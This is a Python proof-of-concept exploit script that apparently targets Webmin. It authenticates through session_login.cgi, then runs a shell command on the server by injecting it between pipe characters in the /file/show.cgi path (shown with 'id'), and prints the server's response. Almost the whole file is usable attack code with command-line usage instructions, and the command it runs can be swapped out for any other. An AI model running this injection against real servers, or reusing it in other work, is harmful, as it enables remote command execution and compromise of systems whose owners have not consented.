#!/usr/bin/env python3

from requests.sessions import session

import sys

if len(sys.argv) < 3:
    print()
    print("[-] Usage:  \t./exp.py target_url username password")
    print("[-] Example:\t./exp.py http://localhost:10000 agent47 password1234!")
    exit(1)

print()
base_url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]

login_cookies = {}

class exp:

    def __init__(self, base_url, username, password):
        self.session = session()
        self.username = username
        self.password = password
        self.base_url = base_url

    def check(self):
        data = {
            "page" : '/',
            "user" : self.username,
            "pass" : self.password
        }
        cookies = {
            "testing": "1",
            "sid": "x"
        }

        login_url = self.base_url + "/session_login.cgi"

        self.session.post(login_url, data = data, cookies=cookies)
        resp_cookies = (self.session.cookies.get_dict())

        return resp_cookies.__contains__('sid')

    def execute(self):
        command = "id"

        request_url = self.base_url + "/file/show.cgi/bin/211|{}|".format(command)
        resp = self.session.get(request_url)
        print(resp.text.strip())

ob = exp(base_url, user, password)

if ob.check() == True:
    ob.execute()
else:
    print("Cannot authenticate with username: {}, password: {}".format(user, password))
